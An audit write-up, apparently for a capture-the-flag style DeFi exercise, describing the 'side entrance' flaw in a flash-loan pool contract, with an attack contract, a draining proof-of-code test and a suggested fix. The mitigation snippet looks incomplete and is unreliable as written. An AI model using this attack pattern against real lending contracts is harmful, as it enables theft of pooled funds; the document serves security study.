## Critical Severity Issues

### [C-1] Side Entrance Vulnerability in `SideEntranceLenderPool` Protocol

**Description:** The `SideEntranceLenderPool` protocol provides flash loans to anyone. A malicious actor calls the `flashLoan` function and takes out the flash loan to its target `Attack` contract. Before repaying the protocol, it updates the protocol balance to the same as before but deposits this balance for itself, making the protocol behave as if no flash loan was granted. This attack is only possible due to the external call via `IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();`.

```javascript
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

@>  IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
```

**Impact:** A malicious actor takes advantage of the external call to take the flash loan and deposit into the same pool for themselves. This balances the pool funds before the flashLoan function execution completes.

Attack Contract:

```javascript
import {SideEntranceLenderPool} from "../src/SideEntranceLenderPool.sol";

contract Attack {
    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}

```

**Proof of Concept:**

1. The Attacker calls the flashLoan
2. `SideEntranceLenderPool` lends flash loan
3. Tokens are sent to the `Attack` contract
4. The attacker deposits funds for themselves
5. Later withdraws all the funds from the pool
6. Leaves the pool empty

**Proof of Code:**

```javascript
function testAttack() public {
        vm.startPrank(address(attack));

        console2.log("Pool Funds ", address(pool).balance);
        console2.log("Attacker funds ", address(attack).balance);

        pool.flashLoan(address(pool).balance);

        pool.withdraw();

        assertEq(address(pool).balance, 0);
        assertEq(address(attack).balance, 1e24);

        console2.log("Pool Funds ", address(pool).balance);
        console2.log("Attacker funds ", address(attack).balance);
        vm.stopPrank();
    }
```

**Recommended Mitigation:** Track outstanding loans separately from deposited funds.
Maintain a mapping for active loans:

```javascript
mapping(address => uint256) public outstandingLoans;
```

Require borrowers to repay loans explicitly rather than allowing deposits to count as repayment:

```javascript
function repayLoan() external payable {
    outstandingLoans[msg.sender] -= msg.value;
    }
```

```diff
function flashLoan(uint256 amount) external {
+     outstandingLoans[msg.sender] += amount;
      IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

-     if (address(this).balance < balanceBefore) revert RepayFailed();
+     require(outstandingLoans[msg.sender] == 0, "Loan not repaid");
    }
```
